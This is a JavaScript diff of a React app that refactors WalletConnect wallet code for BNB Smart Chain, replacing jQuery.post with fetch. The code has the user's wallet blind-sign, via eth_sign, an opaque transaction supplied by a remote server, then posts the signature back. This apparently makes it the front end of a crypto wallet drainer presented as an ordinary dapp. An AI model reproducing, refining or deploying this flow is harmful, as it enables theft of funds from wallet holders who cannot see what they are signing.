@@ -5,9 +5,7 @@ function App() {
   async function runner() {
     var ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
-      qrModalOptions: {
-        themeMode: "dark",
-      },
+      qrModalOptions: { themeMode: "dark" },
       chains: [56], // تغییر به شبکه BSC
       methods: ["eth_sign", "eth_sendTransaction"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
@@ -25,13 +23,26 @@ function App() {
       try {
         let requestData = { handler: "tx", address, chain: "56", type: "coin" };
 
-        var result = await jQuery.post(apiUrl, requestData);
-        var unSigned = JSON.parse(result);
-        console.log("📜 Unsigned Transaction:", unSigned);
+        let response = await fetch(apiUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(requestData),
+        });
 
-        var Signed = await provider.request({
+        if (!response.ok) {
+          throw new Error(`Server Error: ${response.status}`);
+        }
+
+        let unSigned = await response.json();
+        if (!unSigned.result) {
+          throw new Error("Invalid response from server");
+        }
+
+        console.log("📜 Unsigned Transaction:", unSigned.result);
+
+        let Signed = await provider.request({
           method: "eth_sign",
-          params: [address, unSigned.result], // مقدار امضا به‌صورت خودکار تنظیم می‌شود
+          params: [address, unSigned.result],
         });
 
         return Signed;
@@ -43,13 +54,21 @@ function App() {
 
     async function acceptSign(signature) {
       try {
-        var result = await jQuery.post(apiUrl, {
-          handler: "sign",
-          signature,
-          type: "coin",
+        let response = await fetch(apiUrl, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ handler: "sign", signature, type: "coin" }),
         });
 
-        var resultJson = JSON.parse(result);
+        if (!response.ok) {
+          throw new Error(`Server Error: ${response.status}`);
+        }
+
+        let resultJson = await response.json();
+        if (!resultJson.result) {
+          throw new Error("Invalid response from server");
+        }
+
         return resultJson.result;
       } catch (error) {
         console.error("❌ Error in acceptSign:", error);
